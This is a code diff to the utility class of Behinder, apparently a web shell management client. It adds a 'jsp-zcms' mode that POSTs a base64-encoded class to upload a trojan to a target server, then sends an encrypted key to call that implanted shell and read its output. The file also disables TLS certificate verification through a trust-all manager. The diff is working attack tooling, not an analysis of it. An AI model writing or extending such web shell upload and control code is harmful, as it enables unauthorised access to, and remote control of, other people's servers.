@@ -7,12 +7,9 @@ package net.rebeyond.behinder.utils;
 import javax.tools.FileObject;
 import javax.tools.JavaFileManager;
 import javax.tools.ForwardingJavaFileManager;
-import java.net.InetAddress;
-import java.net.UnknownHostException;
+import java.net.*;
 import javax.net.ssl.SSLSocket;
-import java.net.Socket;
 import java.io.IOException;
-import java.net.URI;
 import javax.tools.SimpleJavaFileObject;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.Date;
@@ -64,10 +61,9 @@ import java.io.ByteArrayOutputStream;
 import java.io.InputStreamReader;
 import java.util.List;
 import javax.net.ssl.HttpsURLConnection;
-import java.net.Proxy;
+
 import net.rebeyond.behinder.ui.controller.MainController;
-import java.net.HttpURLConnection;
-import java.net.URL;
+
 import java.util.Random;
 import java.util.HashMap;
 import java.util.regex.Matcher;
@@ -78,21 +74,21 @@ import java.util.Map;
 public class Utils
 {
     private static Map<String, JavaFileObject> fileObjects;
-    
+
     public static boolean checkIP(final String ipAddress) {
         final String ip = "([1-9]|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])(\\.(\\d|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])){3}";
         final Pattern pattern = Pattern.compile(ip);
         final Matcher matcher = pattern.matcher(ipAddress);
         return matcher.matches();
     }
-    
+
     public static boolean checkPort(final String portTxt) {
         final String port = "([0-9]{1,5})";
         final Pattern pattern = Pattern.compile(port);
         final Matcher matcher = pattern.matcher(portTxt);
         return matcher.matches() && Integer.parseInt(portTxt) >= 1 && Integer.parseInt(portTxt) <= 65535;
     }
-    
+
     public static Map<String, String> getKeyAndCookie(final String getUrl, final String password, final Map<String, String> requestHeaders) throws Exception {
         disableSslVerification();
         final Map<String, String> result = new HashMap<String, String>();
@@ -146,12 +142,12 @@ public class Utils
             while (bytesRead > 0) {
                 bytesRead = isr.read(buf);
             }
-            errorMsg = "\u5bc6\u94a5\u83b7\u53d6\u5931\u8d25,\u5bc6\u7801\u9519\u8bef?";
+            errorMsg = "密钥获取失败,密码错误?";
         }
         else if (urlConnection.getResponseCode() == 404) {
             isr = new InputStreamReader(urlConnection.getErrorStream());
             error = true;
-            errorMsg = "\u9875\u9762\u8fd4\u56de404\u9519\u8bef";
+            errorMsg = "页面返回404错误";
         }
         else {
             isr = new InputStreamReader(urlConnection.getInputStream());
@@ -170,7 +166,7 @@ public class Utils
         final Pattern r = Pattern.compile(pattern);
         final Matcher m = r.matcher(rawKey_1);
         if (!m.find()) {
-            throw new Exception("\u9875\u9762\u5b58\u5728\uff0c\u4f46\u662f\u65e0\u6cd5\u83b7\u53d6\u5bc6\u94a5!");
+            throw new Exception("页面存在，但是无法获取密钥!");
         }
         int start = 0;
         int end = 0;
@@ -219,11 +215,11 @@ public class Utils
             ++cycleCount;
         }
     }
-    
+
     public static String getKey(final String password) throws Exception {
         return getMD5(password);
     }
-    
+
     public static Map<String, String> getRawKey(final String getUrl, final String password, final Map<String, String> requestHeaders) throws Exception {
         final Map<String, String> result = new HashMap<String, String>();
         final StringBuffer sb = new StringBuffer();
@@ -268,12 +264,12 @@ public class Utils
         if (urlConnection.getResponseCode() == 500) {
             isr = new InputStreamReader(urlConnection.getErrorStream());
             error = true;
-            errorMsg = "\u5bc6\u94a5\u83b7\u53d6\u5931\u8d25,\u5bc6\u7801\u9519\u8bef?";
+            errorMsg = "密钥获取失败,密码错误?";
         }
         else if (urlConnection.getResponseCode() == 404) {
             isr = new InputStreamReader(urlConnection.getErrorStream());
             error = true;
-            errorMsg = "\u9875\u9762\u8fd4\u56de404\u9519\u8bef";
+            errorMsg = "页面返回404错误";
         }
         else {
             isr = new InputStreamReader(urlConnection.getInputStream());
@@ -290,7 +286,7 @@ public class Utils
         result.put("key", sb.toString());
         return result;
     }
-    
+
     public static String sendPostRequest(final String urlPath, final String cookie, final String data) throws Exception {
         StringBuilder result = new StringBuilder();
         final URL url = new URL(urlPath);
@@ -315,9 +311,9 @@ public class Utils
         }
         return result.toString();
     }
-    
-    public static Map<String, Object> requestAndParse(final String urlPath, final Map<String, String> header, final byte[] data, final int beginIndex, final int endIndex) throws Exception {
-        final Map<String, Object> resultObj = sendPostRequestBinary(urlPath, header, data);
+
+    public static Map<String, Object> requestAndParse(final String urlPath, final Map<String, String> header, final byte[] data, final int beginIndex, final int endIndex,String type,JSONObject shellObject) throws Exception {
+        final Map<String, Object> resultObj = sendPostRequestBinary(urlPath, header, data,type,shellObject);
         byte[] resData = (byte[]) resultObj.get("data");
         if ((beginIndex != 0 || endIndex != 0) && resData.length - endIndex >= beginIndex) {
             resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
@@ -325,8 +321,184 @@ public class Utils
         resultObj.put("data", resData);
         return resultObj;
     }
-    
-    public static Map<String, Object> sendPostRequestBinary(final String urlPath, final Map<String, String> header, final byte[] data) throws Exception {
+
+    private static CookieManager cookieManager = new CookieManager();
+    static{
+
+        cookieManager.setCookiePolicy(CookiePolicy.ACCEPT_ALL);
+        CookieHandler.setDefault(cookieManager);
+    }
+
+    public static Map<String,Object> sendJspZcms(final String urlPath, final Map<String, String> header, final byte[] data,String type,JSONObject shellObject)throws Exception{
+
+        final Map<String, Object> result = new HashMap<String, Object>();
+        //这里分成了2步骤.
+        //步骤1.提交pass属性的base64字符串，这一步是上传马
+        final String password = shellObject.getString("password");
+        final String encode = shellObject.getString("encode");
+        final ByteArrayOutputStream bos = new ByteArrayOutputStream();
+
+
+        final URL url = new URL(urlPath);
+//
+//        Runnable setCookie = ()->{
+//            try{
+//                CookieManager cookieManager = new CookieManager();
+//                cookieManager.setCookiePolicy(CookiePolicy.ACCEPT_ALL);
+//                CookieHandler.setDefault(cookieManager);
+//
+//                URLConnection conn = url.openConnection();
+//                try{
+//                    conn.getContent();
+//                }catch (Exception e){
+//
+//                }
+//
+//                CookieStore cookieJar = cookieManager.getCookieStore();
+//                List<HttpCookie> cookies = cookieJar.getCookies();
+//                for(HttpCookie cookie : cookies){
+//                    System.out.println("cookie:"+cookie);
+//                }
+//
+//            }catch (Exception e){
+//                throw new RuntimeException(e.getMessage());
+//            }
+//        };
+//        setCookie.run();
+
+        //为啥这么用呢？因为为想用代码块区分一下，内部变量方便点，Runnable接口只是他正好有个run方法而已，懒得自己写接口
+        Runnable steep1 = () ->{
+            try{
+
+                String base64Class = new String(data);
+                HttpURLConnection conn;
+                if (MainController.currentProxy.get("proxy") != null) {
+                    final Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
+                    conn = (HttpURLConnection)url.openConnection(proxy);
+                }
+                else {
+                    conn = (HttpURLConnection)url.openConnection();
+                }
+
+                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                conn.setRequestMethod("POST");
+
+                if (header != null) {
+                    final Object[] keys = header.keySet().toArray();
+                    Arrays.sort(keys);
+                    for (final Object key : keys) {
+                        conn.setRequestProperty(key.toString(), header.get(key));
+                    }
+                }
+                conn.setDoOutput(true);
+//                conn.setDoInput(true);
+                String content = password+"=" + URLEncoder.encode(base64Class, "UTF-8");
+                final OutputStream outwritestream = conn.getOutputStream();
+                outwritestream.write(content.getBytes());
+                outwritestream.flush();
+                outwritestream.close();
+
+                Object connt = conn.getContent();
+
+//                String cookie = getCookie(url.toURI(),header.get("Cookie"),cookieManager);
+//
+//                header.put("Cookie",cookie);
+
+            }catch (Exception e){
+                throw new RuntimeException(e.getMessage());
+            }
+        };
+        steep1.run();
+
+        Runnable steep2 = () ->{
+            try{
+                //这一步是调用马，把key传过去
+                String rstr = encode;
+                byte[] rstrBytes = Crypt.Encrypt(rstr.getBytes(),encode);
+                rstr = Base64.encode(rstrBytes);
+
+                HttpURLConnection conn;
+                if (MainController.currentProxy.get("proxy") != null) {
+                    final Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
+                    conn = (HttpURLConnection)url.openConnection(proxy);
+                }
+                else {
+                    conn = (HttpURLConnection)url.openConnection();
+                }
+                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                conn.setRequestMethod("POST");
+                conn.setInstanceFollowRedirects(false);
+                if (header != null) {
+                    final Object[] keys = header.keySet().toArray();
+                    Arrays.sort(keys);
+                    for (final Object key : keys) {
+                        conn.setRequestProperty(key.toString(), header.get(key));
+                    }
+                }
+                conn.setDoOutput(true);
+                conn.setDoInput(true);
+                String content = password+"=" + rstr;
+                final OutputStream outwritestream = conn.getOutputStream();
+                outwritestream.write(content.getBytes());
+                outwritestream.flush();
+                outwritestream.close();
+                int response = conn.getResponseCode();
+                if (response == 200) {
+                    final DataInputStream din = new DataInputStream(conn.getInputStream());
+                    final byte[] buffer = new byte[1024];
+                    int length = 0;
+                    while ((length = din.read(buffer)) != -1) {
+                        bos.write(buffer, 0, length);
+                    }
+                    final byte[] resData = bos.toByteArray();
+                    result.put("data", resData);
+                    final Map<String, String> responseHeader = new HashMap<String, String>();
+                    for (final String key2 : conn.getHeaderFields().keySet()) {
+                        responseHeader.put(key2, conn.getHeaderField(key2));
+                    }
+                    responseHeader.put("status", conn.getResponseCode() + "");
+                    result.put("header", responseHeader);
+                    return;
+                }
+                final DataInputStream din = new DataInputStream(conn.getErrorStream());
+                final byte[] buffer = new byte[1024];
+                int length = 0;
+                while ((length = din.read(buffer)) != -1) {
+                    bos.write(buffer, 0, length);
+                }
+                throw new Exception(new String(bos.toByteArray(), "GBK"));
+            }catch (Exception e){
+                throw new RuntimeException(e.getMessage());
+            }
+        };
+        steep2.run();
+        return result;
+    }
+
+//    private static String getCookie(URI uri,String cookie,CookieManager cookieManager){
+//
+//        if(cookie == null){
+//            cookie = "";
+//        }
+//        StringBuffer nowCookie = new StringBuffer();
+//
+//        List<HttpCookie> cookies = cookieManager.getCookieStore().get(uri);
+//        if(cookies!=null&&cookies.size()>0){
+//            cookies.forEach(c->{
+//                nowCookie.append(c.getName());
+//                nowCookie.append("=");
+//                nowCookie.append(c.getValue());
+//                nowCookie.append(";");
+//            });
+//        }
+//        nowCookie.append(cookie);
+//        return nowCookie.toString();
+//    }
+
+    public static Map<String, Object> sendPostRequestBinary(final String urlPath, final Map<String, String> header, final byte[] data,String type,JSONObject shellObject) throws Exception {
+        if(type.equals("jsp-zcms")){
+            return sendJspZcms(urlPath,header,data,type,shellObject);
+        }
         final Map<String, Object> result = new HashMap<String, Object>();
         final ByteArrayOutputStream bos = new ByteArrayOutputStream();
         final URL url = new URL(urlPath);
@@ -379,7 +551,7 @@ public class Utils
         }
         throw new Exception(new String(bos.toByteArray(), "GBK"));
     }
-    
+
     public static String sendPostRequest(final String urlPath, final String cookie, final byte[] data) throws Exception {
         StringBuilder sb = new StringBuilder();
         final URL url = new URL(urlPath);
@@ -413,9 +585,9 @@ public class Utils
         while ((line = reader.readLine()) != null) {
             sb = sb.append(line + "\n");
         }
-        throw new Exception("\u8bf7\u6c42\u8fd4\u56de\u5f02\u5e38" + sb.toString());
+        throw new Exception("请求返回异常" + sb.toString());
     }
-    
+
     public static String sendGetRequest(final String urlPath, final String cookie) throws Exception {
         StringBuilder sb = new StringBuilder();
         final URL url = new URL(urlPath);
@@ -445,9 +617,9 @@ public class Utils
         while ((line = reader.readLine()) != null) {
             sb = sb.append(line + "\n");
         }
-        throw new Exception("\u8bf7\u6c42\u8fd4\u56de\u5f02\u5e38" + sb.toString());
+        throw new Exception("请求返回异常" + sb.toString());
     }
-    
+
     public static byte[] getEvalData(final String key, final int encryptType, final String type, final byte[] payload) throws Exception {
         byte[] result = null;
         if (type.equals("jsp")) {
@@ -470,7 +642,7 @@ public class Utils
         }
         return result;
     }
-    
+
     public static byte[] getPluginData(final String key, final int encryptType, final String payloadPath, final Map<String, String> params, final String type) throws Exception {
         if (type.equals("jsp")) {
             final byte[] bincls = Params.getParamedClassForPlugin(payloadPath, params);
@@ -495,11 +667,11 @@ public class Utils
         }
         return null;
     }
-    
+
     public static byte[] getData(final String key, final int encryptType, final String className, final Map<String, String> params, final String type) throws Exception {
         return getData(key, encryptType, className, params, type, null);
     }
-    
+
     public static String map2Str(final Map<String, String> paramsMap) {
         String result = "";
         for (final String key : paramsMap.keySet()) {
@@ -507,9 +679,9 @@ public class Utils
         }
         return result;
     }
-    
+
     public static byte[] getData(final String key, final int encryptType, final String className, final Map<String, String> params, final String type, final byte[] extraData) throws Exception {
-        if (type.equals("jsp")) {
+        if (type.equals("jsp")||type.equals("jsp-zcms")) {
             byte[] bincls = Params.getParamedClass(className, params);
             if (extraData != null) {
                 bincls = CipherUtils.mergeByteArray(new byte[][] { bincls, extraData });
@@ -546,7 +718,7 @@ public class Utils
         }
         return null;
     }
-    
+
     public static byte[] getFileData(final String filePath) throws Exception {
         byte[] fileContent = new byte[0];
         final FileInputStream fis = new FileInputStream(new File(filePath));
@@ -558,7 +730,7 @@ public class Utils
         fis.close();
         return fileContent;
     }
-    
+
     public static List<byte[]> splitBytes(final byte[] content, final int size) throws Exception {
         final List<byte[]> result = new ArrayList<byte[]>();
         final byte[] buffer = new byte[size];
@@ -570,13 +742,13 @@ public class Utils
         bis.close();
         return result;
     }
-    
+
     public static void setClipboardString(final String text) {
         final Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
         final Transferable trans = new StringSelection(text);
         clipboard.setContents(trans, null);
     }
-    
+
     public static byte[] getResourceData(final String filePath) throws Exception {
         final InputStream is = Utils.class.getClassLoader().getResourceAsStream(filePath);
         final ByteArrayOutputStream bos = new ByteArrayOutputStream();
@@ -589,7 +761,7 @@ public class Utils
         is.close();
         return bos.toByteArray();
     }
-    
+
     public static byte[] ascii2unicode(final String str, final int type) throws Exception {
         final ByteArrayOutputStream buf = new ByteArrayOutputStream();
         final DataOutputStream out = new DataOutputStream(buf);
@@ -602,25 +774,25 @@ public class Utils
         }
         return buf.toByteArray();
     }
-    
+
     public static byte[] mergeBytes(final byte[] a, final byte[] b) throws Exception {
         final ByteArrayOutputStream output = new ByteArrayOutputStream();
         output.write(a);
         output.write(b);
         return output.toByteArray();
     }
-    
+
     public static byte[] getClassFromSourceCode(final String sourceCode) throws Exception {
         return Run.getClassFromSourceCode(sourceCode);
     }
-    
+
     public static String getSelfPath() throws Exception {
         String currentPath = Utils.class.getProtectionDomain().getCodeSource().getLocation().getPath();
         currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
         currentPath = new File(currentPath).getCanonicalPath();
         return currentPath;
     }
-    
+
     public static JSONObject parsePluginZip(final String zipFilePath) throws Exception {
         final String pluginRootPath = getSelfPath() + "/Plugins";
         String pluginName = "";
@@ -657,7 +829,7 @@ public class Utils
         pluginEntity.put("comment", (Object)pluginConfig2.getProperty("comment"));
         return pluginEntity;
     }
-    
+
     public static <T> T json2Obj(final JSONObject json, final Class target) throws Exception {
         final Object obj = target.newInstance();
         for (final Field f : target.getDeclaredFields()) {
@@ -671,7 +843,7 @@ public class Utils
         }
         return (T)obj;
     }
-    
+
     public static String getMD5(final String input) throws NoSuchAlgorithmException {
         if (input == null || input.length() == 0) {
             return null;
@@ -685,7 +857,7 @@ public class Utils
         }
         return sb.toString().substring(0, 16);
     }
-    
+
     public static void main(final String[] args) {
         final String sourceCode = "package net.rebeyond.behinder.utils;public class Hello{    public String sayHello (String name) {return \"Hello,\" + name + \"!\";}}";
         try {
@@ -695,23 +867,23 @@ public class Utils
             e.printStackTrace();
         }
     }
-    
+
     private static void disableSslVerification() {
         try {
             final TrustManager[] trustAllCerts = { new X509TrustManager() {
-                    @Override
-                    public X509Certificate[] getAcceptedIssuers() {
-                        return null;
-                    }
-                    
-                    @Override
-                    public void checkClientTrusted(final X509Certificate[] certs, final String authType) {
-                    }
-                    
-                    @Override
-                    public void checkServerTrusted(final X509Certificate[] certs, final String authType) {
-                    }
-                } };
+                @Override
+                public X509Certificate[] getAcceptedIssuers() {
+                    return null;
+                }
+
+                @Override
+                public void checkClientTrusted(final X509Certificate[] certs, final String authType) {
+                }
+
+                @Override
+                public void checkServerTrusted(final X509Certificate[] certs, final String authType) {
+                }
+            } };
             final SSLContext sc = SSLContext.getInstance("SSL");
             sc.init(null, trustAllCerts, new SecureRandom());
             final List<String> cipherSuites = new ArrayList<String>();
@@ -736,7 +908,7 @@ public class Utils
             e2.printStackTrace();
         }
     }
-    
+
     public static Map<String, String> jsonToMap(final JSONObject obj) {
         final Map<String, String> result = new HashMap<String, String>();
         for (final String key : obj.keySet()) {
@@ -744,7 +916,7 @@ public class Utils
         }
         return result;
     }
-    
+
     public static Timestamp stringToTimestamp(final String timeString) {
         Timestamp timestamp = null;
         try {
@@ -755,7 +927,7 @@ public class Utils
         catch (Exception ex) {}
         return timestamp;
     }
-    
+
     public static String getRandomString(final int length) {
         final String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
         final Random random = new Random();
@@ -766,26 +938,26 @@ public class Utils
         }
         return sb.toString();
     }
-    
+
     static {
         Utils.fileObjects = new ConcurrentHashMap<String, JavaFileObject>();
     }
-    
+
     public static class MyJavaFileObject extends SimpleJavaFileObject
     {
         private String source;
         private ByteArrayOutputStream outPutStream;
-        
+
         public MyJavaFileObject(final String name, final String source) {
             super(URI.create("String:///" + name + Kind.SOURCE.extension), Kind.SOURCE);
             this.source = source;
         }
-        
+
         public MyJavaFileObject(final String name, final Kind kind) {
             super(URI.create("String:///" + name + kind.extension), kind);
             this.source = null;
         }
-        
+
         @Override
         public CharSequence getCharContent(final boolean ignoreEncodingErrors) {
             if (this.source == null) {
@@ -793,46 +965,46 @@ public class Utils
             }
             return this.source;
         }
-        
+
         @Override
         public OutputStream openOutputStream() throws IOException {
             return this.outPutStream = new ByteArrayOutputStream();
         }
-        
+
         public byte[] getCompiledBytes() {
             return this.outPutStream.toByteArray();
         }
     }
-    
+
     private static class MySSLSocketFactory extends SSLSocketFactory
     {
         private SSLSocketFactory sf;
         private String[] enabledCiphers;
-        
+
         private MySSLSocketFactory(final SSLSocketFactory sf, final String[] enabledCiphers) {
             this.sf = null;
             this.enabledCiphers = null;
             this.sf = sf;
             this.enabledCiphers = enabledCiphers;
         }
-        
+
         private Socket getSocketWithEnabledCiphers(final Socket socket) {
             if (this.enabledCiphers != null && socket != null && socket instanceof SSLSocket) {
                 ((SSLSocket)socket).setEnabledCipherSuites(this.enabledCiphers);
             }
             return socket;
         }
-        
+
         @Override
         public Socket createSocket(final Socket s, final String host, final int port, final boolean autoClose) throws IOException {
             return this.getSocketWithEnabledCiphers(this.sf.createSocket(s, host, port, autoClose));
         }
-        
+
         @Override
         public String[] getDefaultCipherSuites() {
             return this.sf.getDefaultCipherSuites();
         }
-        
+
         @Override
         public String[] getSupportedCipherSuites() {
             if (this.enabledCiphers == null) {
@@ -840,34 +1012,34 @@ public class Utils
             }
             return this.enabledCiphers;
         }
-        
+
         @Override
         public Socket createSocket(final String host, final int port) throws IOException, UnknownHostException {
             return this.getSocketWithEnabledCiphers(this.sf.createSocket(host, port));
         }
-        
+
         @Override
         public Socket createSocket(final InetAddress address, final int port) throws IOException {
             return this.getSocketWithEnabledCiphers(this.sf.createSocket(address, port));
         }
-        
+
         @Override
         public Socket createSocket(final String host, final int port, final InetAddress localAddress, final int localPort) throws IOException, UnknownHostException {
             return this.getSocketWithEnabledCiphers(this.sf.createSocket(host, port, localAddress, localPort));
         }
-        
+
         @Override
         public Socket createSocket(final InetAddress address, final int port, final InetAddress localaddress, final int localport) throws IOException {
             return this.getSocketWithEnabledCiphers(this.sf.createSocket(address, port, localaddress, localport));
         }
     }
-    
+
     public static class MyJavaFileManager extends ForwardingJavaFileManager<JavaFileManager>
     {
         protected MyJavaFileManager(final JavaFileManager fileManager) {
             super(fileManager);
         }
-        
+
         @Override
         public JavaFileObject getJavaFileForInput(final Location location, final String className, final JavaFileObject.Kind kind) throws IOException {
             final JavaFileObject javaFileObject = Utils.fileObjects.get(className);
@@ -876,7 +1048,7 @@ public class Utils
             }
             return javaFileObject;
         }
-        
+
         @Override
         public JavaFileObject getJavaFileForOutput(final Location location, final String qualifiedClassName, final JavaFileObject.Kind kind, final FileObject sibling) throws IOException {
             final JavaFileObject javaFileObject = new MyJavaFileObject(qualifiedClassName, kind);
